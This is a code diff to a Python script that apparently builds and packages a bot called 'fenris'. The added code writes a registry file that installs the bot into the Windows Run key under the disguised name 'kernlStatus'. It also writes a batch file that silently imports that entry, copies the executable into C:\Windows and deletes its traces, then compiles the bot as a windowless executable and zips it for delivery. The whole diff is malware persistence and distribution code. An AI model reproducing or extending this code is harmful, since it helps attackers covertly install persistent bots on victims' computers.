@@ -76,12 +76,35 @@ else:
 		f = open("fenris.py", "w")
 		f.write(newFileContent)
 		f.close()
+		
+		# create registry key and add it
+		botRegFilename = str(randint(0, 5000)) + ".reg"
+		botRegPayload = "Windows Registry Editor Version 5.00\r\n\r\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]\r\n\"kernlStatus\"=\"C:\\\\Windows\\\\fenris.exe\""
+		botReg = open(botRegFilename, "w")
+		botReg.write(botRegPayload)
+		botReg.close()		
+		
+		# create batch file
+		batContent = "start\r\nregedit /s " + botRegFilename + "\r\ncopy \"fenris.exe\" \"C:\\Windows\\fenris.exe\"\r\ndel \"fenris.exe\"\r\ndel \"" + botRegFilename + "\"\r\nexit"
+		batFile = open("fenris.bat", "w")
+		batFile.write(batContent)
+		batFile.close()
+		
 		# cross compile...
 		virtualEnvWine = raw_input("# Virtual wine environment root-path: ")
 		pyinstaller = raw_input("# pyinstaller.py root-path: ")
 		os.system(". " + virtualEnvWine + "/bin/activate; wine c:/Python27/python.exe " + pyinstaller + " -w -a -F fenris.py")
-		print myTool.green + "[+]" + myTool.stop + " fenris.exe saved into dist/ folder."
-		print myTool.green + "[+]" + myTool.stop + " The encryption key for fenris.exe is: " + key
+		
+		# make zip
+		os.system("rm fenris.zip")
+		os.system("cp dist/fenris.exe .")
+		os.system("zip fenris.zip fenris.bat " + botRegFilename + " fenris.exe")
+		os.system("rm fenris.bat")
+		os.system("rm fenris.exe")
+		os.system("rm " + botRegFilename)
+		
+		print myTool.green + "[+]" + myTool.stop + " fenris.zip saved (execute the .bat file to install the bot)."
+		print myTool.green + "[+]" + myTool.stop + " The encryption key for the bot is: " + key
 		sys.exit()
 				
 	if "-s" in sys.argv or "--setup" in sys.argv:
